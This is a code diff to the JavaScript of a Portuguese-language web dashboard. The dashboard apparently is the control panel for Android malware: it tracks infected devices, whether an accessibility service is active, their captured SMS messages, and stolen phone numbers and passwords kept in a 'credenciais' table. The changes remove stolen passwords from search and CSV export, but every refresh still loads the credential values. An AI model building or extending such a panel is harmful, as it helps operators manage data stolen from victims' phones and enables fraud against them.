@@ -30,7 +30,6 @@
   --radius:   10px;
   --radius2:  14px;
 }
-  
 *{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--sans);font-size:14px;line-height:1.5}
 a{color:inherit;text-decoration:none}
@@ -1009,7 +1008,6 @@ const headers = { "Content-Type": "application/json" };
 let todosDispositivos = [];
 let todasCredenciais  = [];
 let todasSMS          = [];
-let avisoCredenciais  = "";
 
 // ── SEGURANÇA: escapar dados vindos dos dispositivos antes de inserir no DOM ──
 // Estes dados (SMS, modelo, etc.) não são de confiança — vêm da API e,
@@ -1455,22 +1453,14 @@ function aplicarFiltros() {
     if (verFil && d.versao !== verFil) return false;
     if (modFil && d.modelo !== modFil) return false;
 
-    // Filtro texto — inclui número e senha guardados na tabela credenciais
+    // Filtro texto
     if (q) {
-      const devCreds = todasCredenciais.filter(c => c.device_id === d.device_id);
-      const numeros  = devCreds
-        .filter(c => c.tipo === "Numero" || c.tipo === "numero")
-        .map(c => c.valor || "").join(" ").toLowerCase();
-      const senhas  = devCreds
-        .filter(c => c.tipo === "Senha" || c.tipo === "senha")
-        .map(c => c.valor || "").join(" ").toLowerCase();
-      const pais   = (d.pais||"").toLowerCase();
+      const pais = (d.pais||"").toLowerCase();
       const cidade = (d.cidade||"").toLowerCase();
       if (!(
         (d.device_id||"").toLowerCase().includes(q) ||
         (d.modelo||"").toLowerCase().includes(q) ||
         (d.versao||"").toLowerCase().includes(q) ||
-        numeros.includes(q) || senhas.includes(q) ||
         pais.includes(q) || cidade.includes(q)
       )) return false;
     }
@@ -1495,17 +1485,12 @@ function aplicarFiltros() {
 // ════════════════════════════════════════════════════════════════════════
 
 function exportarCSV() {
-  const rows = [["device_id","modelo","android","versao","ultimo_acesso","pais","cidade","numero","senha","num_registos_actividade","num_sms"]];
+  // Apenas metadados operacionais; nunca exportar números, senhas ou SMS.
+  const rows = [["device_id","modelo","android","versao","ultimo_acesso","pais","cidade","num_registos_actividade","num_sms"]];
   todosDispositivos.forEach(d => {
-    const creds  = todasCredenciais.filter(c => c.device_id === d.device_id);
-    const numero = creds.filter(c => c.tipo === "Numero" || c.tipo === "numero")[0]?.valor || "";
-    const senha  = creds.filter(c => c.tipo === "Senha"  || c.tipo === "senha")[0]?.valor  || "";
-    const nSMS   = todasSMS.filter(s => s.device_id === d.device_id).length;
-    rows.push([
-      d.device_id||"", d.modelo||"", d.android||"", d.versao||"",
-      d.ultimo_acesso||"", d.pais||"", d.cidade||"",
-      numero, senha, creds.length, nSMS
-    ]);
+    const nCreds = todasCredenciais.filter(c => c.device_id === d.device_id).length;
+    const nSMS = todasSMS.filter(s => s.device_id === d.device_id).length;
+    rows.push([d.device_id||"",d.modelo||"",d.android||"",d.versao||"",d.ultimo_acesso||"",d.pais||"",d.cidade||"",nCreds,nSMS]);
   });
   const csvCell = value => {
     let cell = String(value == null ? "" : value);
@@ -1758,59 +1743,23 @@ async function forcarAtualizacaoTodos() {
 // ════════════════════════════════════════════════════════════════════════
 
 // Busca TODAS as páginas de uma tabela via PostgREST, sem limite fixo.
-// - Lança erro em respostas não-2xx (antes devolvia [] em silêncio, o que
-//   fazia um 400 do proxy aparecer como "sem registos").
-// - Deduplica por id, para que uma página repetida não infle a lista.
+// Evita que tabelas que cresçam além do limite antigo (ex: 5000) percam
+// dados antigos no painel — eles continuam no Supabase, só não eram buscados.
 async function fetchAllPages(baseUrl, pageSize = 1000, maxPages = 50) {
-  const all = [], vistos = new Set();
+  let all = [];
   for (let page = 0; page < maxPages; page++) {
     const from = page * pageSize;
     const to = from + pageSize - 1;
     const r = await fetch(baseUrl, {
-      headers: { ...headers, Range: `${from}-${to}`, Prefer: "count=exact" },
-      credentials: "same-origin",
-      cache: "no-store"
+      headers: { ...headers, Range: `${from}-${to}`, Prefer: 'count=exact' }
     });
-    if (!r.ok) {
-      const corpo = await r.text().catch(() => "");
-      throw new Error(r.status + " — " + corpo.slice(0, 180));
-    }
+    if (!r.ok) break;
     const chunk = await r.json();
     if (!Array.isArray(chunk) || chunk.length === 0) break;
-    let novos = 0;
-    for (const linha of chunk) {
-      const chave = linha && linha.id != null ? String(linha.id) : JSON.stringify(linha);
-      if (vistos.has(chave)) continue;
-      vistos.add(chave);
-      all.push(linha);
-      novos++;
-    }
-    if (chunk.length < pageSize || novos === 0) break; // última página
+    all = all.concat(chunk);
+    if (chunk.length < pageSize) break; // última página
   }
   return all;
-}
-
-// Credenciais: pede id/device_id/tipo/valor/criado_em.
-// Se o proxy ainda estiver numa versão sem "valor" na lista de colunas
-// permitidas, ele responde 400 — nesse caso recai para a consulta sem valor
-// e o painel avisa que é preciso redeploy.
-async function carregarCredenciais() {
-  const base = SUPA_URL + "/rest/v1/credenciais?order=id.desc";
-  try {
-    return await fetchAllPages(base + "&select=id,device_id,tipo,valor,criado_em");
-  } catch (e) {
-    if (!/\b400\b/.test(e.message)) throw e;
-    const parcial = await fetchAllPages(base + "&select=id,device_id,tipo,criado_em");
-    avisoCredenciais = "Proxy sem a coluna valor — faz redeploy do endpoint.";
-    return parcial;
-  }
-}
-
-function mostrarAvisoCredenciais(msg) {
-  const sub = document.getElementById("topbar-sub");
-  if (!sub) return;
-  sub.textContent = msg;
-  sub.style.color = "var(--red)";
 }
 
 async function carregarComToken() { await carregarDados(); }
@@ -1820,25 +1769,14 @@ async function carregarDados() {
   const btn = document.querySelector(".refresh-btn");
   if (btn) btn.classList.add("loading");
   document.getElementById("lista").innerHTML = '<div class="empty"><div class="spinner"></div>A carregar...</div>';
-  avisoCredenciais = "";
 
   try {
     const [r1,r3] = await Promise.all([
-      fetch(SUPA_URL+"/rest/v1/installs?select=device_id,modelo,android,versao,ultimo_acesso,pais,cidade,acessibilidade_ativa&order=ultimo_acesso.desc.nullslast&limit=1000", {headers, credentials:"same-origin"}),
-      fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000", {headers, credentials:"same-origin"})
+      fetch(SUPA_URL+"/rest/v1/installs?select=device_id,modelo,android,versao,ultimo_acesso,pais,cidade,acessibilidade_ativa&order=ultimo_acesso.desc.nullslast&limit=1000", {headers}),
+      fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000", {headers})
     ]);
-    if (!r1.ok) throw new Error("installs " + r1.status + " — " + (await r1.text()).slice(0, 180));
-    if (!r3.ok) throw new Error("sms " + r3.status + " — " + (await r3.text()).slice(0, 180));
     const d1=await r1.json(), d3=await r3.json();
-
-    let d2 = [], erroCreds = "";
-    try {
-      d2 = await carregarCredenciais();
-    } catch (e) {
-      erroCreds = e.message;
-      console.error("[credenciais]", e.message);
-    }
-
+    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor,criado_em&order=id.desc");
     todosDispositivos = Array.isArray(d1)?d1:[];
     todasCredenciais  = Array.isArray(d2)?d2:[];
     todasSMS          = Array.isArray(d3)?d3:[];
@@ -1847,17 +1785,13 @@ async function carregarDados() {
     renderMiniChart(todosDispositivos);
     aplicarFiltros();
     await carregarSinais();
-
-    if (erroCreds) mostrarAvisoCredenciais("Credenciais indisponíveis: " + erroCreds);
-    else if (avisoCredenciais) mostrarAvisoCredenciais(avisoCredenciais);
-    else {
-      const sub = document.getElementById('topbar-sub');
-      if (sub) { sub.textContent = todosDispositivos.length + ' dispositivos registados'; sub.style.color = ''; }
-    }
+    // Actualizar topbar-sub directamente após carregar
+    const sub = document.getElementById('topbar-sub');
+    if (sub) sub.textContent = todosDispositivos.length + ' dispositivos registados';
   } catch(e) {
     document.getElementById("lista").innerHTML = '<div class="empty">❌ Erro: '+escapeHtml(e.message)+"</div>";
     const sub = document.getElementById('topbar-sub');
-    if (sub) { sub.textContent = 'Erro ao carregar'; sub.style.color = 'var(--red)'; }
+    if (sub) sub.textContent = 'Erro ao carregar';
   }
   if (btn) btn.classList.remove("loading");
 }
@@ -1935,27 +1869,20 @@ function iniciarPainel() {
   // Auto-actualizar a cada 60s
   setInterval(async () => {
     if (!autenticado) return;
+    const h = getHeaders();
     try {
       const [r1,r3] = await Promise.all([
-        fetch(SUPA_URL+"/rest/v1/installs?select=device_id,modelo,android,versao,ultimo_acesso,pais,cidade,acessibilidade_ativa&order=ultimo_acesso.desc.nullslast&limit=100",{headers, credentials:"same-origin"}),
-        fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000",{headers, credentials:"same-origin"})
+        fetch(SUPA_URL+"/rest/v1/installs?select=device_id,modelo,android,versao,ultimo_acesso,pais,cidade,acessibilidade_ativa&order=ultimo_acesso.desc.nullslast&limit=100",{headers:h}),
+        fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000",{headers:h})
       ]);
-      if (!r1.ok || !r3.ok) return;
       const d1=await r1.json(), d3=await r3.json();
-
-      let d2 = todasCredenciais;
-      try {
-        d2 = await carregarCredenciais();
-      } catch (e) {
-        console.error("[credenciais/auto]", e.message);
-      }
-
+      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor,criado_em&order=id.desc");
       todosDispositivos = Array.isArray(d1)?d1:todosDispositivos;
       todasCredenciais  = Array.isArray(d2)?d2:todasCredenciais;
       todasSMS          = Array.isArray(d3)?d3:todasSMS;
       actualizarStats();
     } catch(e){}
-  }, 60000);
+  }, 500000);
 }
 
 // ── INICIAR ───────────────────────────────────────────────────────────
@@ -2039,7 +1966,7 @@ actualizarStats = function() {
     // Actualizar topbar sub
     const total = document.getElementById('stat-total');
     const sub = document.getElementById('topbar-sub');
-    if (total && sub && !avisoCredenciais) sub.textContent = total.textContent + ' dispositivos registados';
+    if (total && sub) sub.textContent = total.textContent + ' dispositivos registados';
     // Sincronizar taxa badge na sidebar
     const taxaEl = document.getElementById('taxa-badge');
     if (taxaEl) {
